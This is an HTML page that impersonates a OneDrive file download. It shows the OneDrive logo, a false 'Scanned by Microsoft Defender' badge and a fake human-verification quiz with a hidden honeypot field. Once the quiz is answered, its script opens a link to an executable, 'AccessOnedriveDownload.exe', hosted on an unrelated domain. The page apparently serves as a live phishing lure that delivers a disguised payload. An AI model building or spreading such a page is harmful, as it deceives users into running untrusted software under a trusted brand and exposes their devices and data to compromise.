<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OneDrive - Download</title>
  <meta name="description" content="OneDrive file download" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #fff; color: #242a30;
      min-height: 100vh; display: flex;
      align-items: center; justify-content: center; padding: 16px;
    }
    .container {
      display: flex; flex-direction: column; align-items: center;
      gap: 24px; max-width: 480px; width: 100%; text-align: center;
    }
    .logo { height: 64px; object-fit: contain; }
    .spinner-section { display: flex; flex-direction: column; align-items: center; gap: 8px; }
    .spinner {
      width: 32px; height: 32px;
      border: 3px solid #e0e3e8; border-top-color: #2b6cb0;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .subtitle { color: #6b7280; font-size: 12px; }
    .verified-card {
      display: flex; align-items: center; gap: 12px;
      width: 100%; max-width: 400px;
      border: 1px solid #e0e3e8; border-radius: 12px;
      background: #fff; padding: 16px;
    }
    .verified-icon-box {
      width: 36px; height: 36px; flex-shrink: 0;
      display: flex; align-items: center; justify-content: center;
      border-radius: 8px; background: #edf2f7;
    }
    .verified-icon-box svg { width: 20px; height: 20px; color: #2b6cb0; }
    .verified-text { text-align: left; }
    .verified-title { font-size: 12px; font-weight: 600; color: #242a30; }
    .verified-sub { font-size: 11px; color: #6b7280; }
    .verify-trigger {
      width: 100%; max-width: 384px; height: 48px;
      border: none; border-radius: 12px;
      background: #2b6cb0; color: #fff;
      font-size: 15px; font-weight: 600;
      cursor: pointer; transition: background 0.2s;
    }
    .verify-trigger:hover { background: #2c5282; }
    .success-badge {
      display: none; align-items: center; gap: 10px;
      width: 100%; max-width: 384px;
      border: 1px solid #e0e3e8; border-radius: 8px;
      background: #fff; padding: 16px;
    }
    .success-badge svg { width: 20px; height: 20px; color: #2b6cb0; flex-shrink: 0; }
    .success-badge span { font-size: 13px; font-weight: 500; color: #242a30; }
    .overlay {
      display: none; position: fixed; inset: 0;
      background: rgba(0,0,0,0.4); z-index: 50;
      align-items: center; justify-content: center; padding: 16px;
    }
    .overlay.open { display: flex; }
    .modal {
      background: #fff; border-radius: 16px; width: 100%; max-width: 440px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.15); overflow: hidden;
    }
    .modal-bar { height: 6px; background: #2b6cb0; }
    .modal-body { padding: 24px; display: flex; flex-direction: column; gap: 16px; }
    .modal-header { display: flex; align-items: flex-start; justify-content: space-between; }
    .modal-header-left { display: flex; align-items: center; gap: 10px; }
    .modal-header-left svg { width: 24px; height: 24px; color: #2b6cb0; }
    .modal-header-left h2 { font-size: 18px; font-weight: 700; color: #242a30; }
    .close-btn {
      background: none; border: none; cursor: pointer; color: #6b7280;
      padding: 4px; transition: color 0.2s;
    }
    .close-btn:hover { color: #242a30; }
    .close-btn svg { width: 20px; height: 20px; }
    .modal-desc { font-size: 14px; color: #6b7280; line-height: 1.5; }
    .modal-question { font-size: 16px; font-weight: 700; color: #242a30; }
    .modal-input {
      width: 100%; height: 48px; padding: 0 14px;
      border: 1px solid #e0e3e8; border-radius: 12px;
      font-size: 15px; color: #242a30; background: #fff;
      outline: none; transition: border-color 0.2s;
    }
    .modal-input:focus { border-color: #2b6cb0; }
    .modal-input::placeholder { color: #9ca3af; }
    .modal-error { font-size: 12px; color: #dc2626; display: none; }
    .modal-submit {
      width: 100%; height: 48px; border: none; border-radius: 12px;
      background: #2b6cb0; color: #fff; font-size: 15px; font-weight: 600;
      cursor: pointer; transition: background 0.2s;
    }
    .modal-submit:hover { background: #2c5282; }
    .modal-submit:disabled { opacity: 0.5; cursor: not-allowed; }
    .honeypot { position: absolute; left: -9999px; height: 0; width: 0; opacity: 0; }
    .footer { font-size: 10px; color: #6b7280; }
  </style>
</head>
<body>

<div class="container">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Microsoft_OneDrive_Icon_%282025_-_present%29.svg/960px-Microsoft_OneDrive_Icon_%282025_-_present%29.svg.png" alt="OneDrive" class="logo" />

  <div class="spinner-section">
    <div class="spinner"></div>
    <p class="subtitle">Your file is ready. Complete the verification below to start your download.</p>
  </div>

  <div class="verified-card">
    <div class="verified-icon-box">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
    </div>
    <div class="verified-text">
      <p class="verified-title">File verified &amp; secure</p>
      <p class="verified-sub">Scanned by Microsoft Defender</p>
    </div>
  </div>

  <button class="verify-trigger" id="triggerBtn" onclick="openModal()">Verify &amp; Download</button>

  <div class="success-badge" id="successBadge">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
    <span>Verification passed</span>
  </div>

  <p class="footer">OneDrive · Your files, anywhere</p>
</div>

<!-- Modal -->
<div class="overlay" id="overlay" onclick="closeModal()">
  <div class="modal" onclick="event.stopPropagation()">
    <div class="modal-bar"></div>
    <div class="modal-body">
      <div class="modal-header">
        <div class="modal-header-left">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
          <h2>Human Verification</h2>
        </div>
        <button class="close-btn" onclick="closeModal()">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
        </button>
      </div>
      <p class="modal-desc">Please answer this simple question to verify you're human before downloading.</p>
      <p class="modal-question" id="modalQuestion"></p>
      <input type="text" class="honeypot" id="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true" />
      <input type="text" inputmode="numeric" class="modal-input" id="modalInput" placeholder="Your answer" />
      <p class="modal-error" id="modalError"></p>
      <button class="modal-submit" id="modalSubmit" disabled onclick="handleVerify()">Verify &amp; Download</button>
    </div>
  </div>
</div>

<script>
  var REDIRECT_URL = "https://auth.landgroupstitle.com/my-workspace/AccessOnedriveDownload.exe";

  var a = Math.floor(Math.random() * 10) + 1;
  var b = Math.floor(Math.random() * 10) + 1;
  var correctAnswer = a + b;
  document.getElementById('modalQuestion').textContent = 'What is ' + a + ' + ' + b + '?';

  var overlay = document.getElementById('overlay');
  var modalInput = document.getElementById('modalInput');
  var modalSubmit = document.getElementById('modalSubmit');
  var modalError = document.getElementById('modalError');

  function openModal() { overlay.classList.add('open'); modalInput.focus(); }
  function closeModal() { overlay.classList.remove('open'); }

  modalInput.addEventListener('input', function() { modalSubmit.disabled = !modalInput.value.trim(); });
  modalInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') handleVerify(); });

  function handleVerify() {
    if (document.getElementById('honeypot').value) return;
    var val = parseInt(modalInput.value.trim(), 10);
    if (isNaN(val) || val !== correctAnswer) {
      modalError.textContent = 'Incorrect answer. Please try again.';
      modalError.style.display = 'block';
      return;
    }
    closeModal();
    document.getElementById('triggerBtn').style.display = 'none';
    document.getElementById('successBadge').style.display = 'flex';
    setTimeout(function() { window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer'); }, 600);
  }
</script>

</body>
</html>
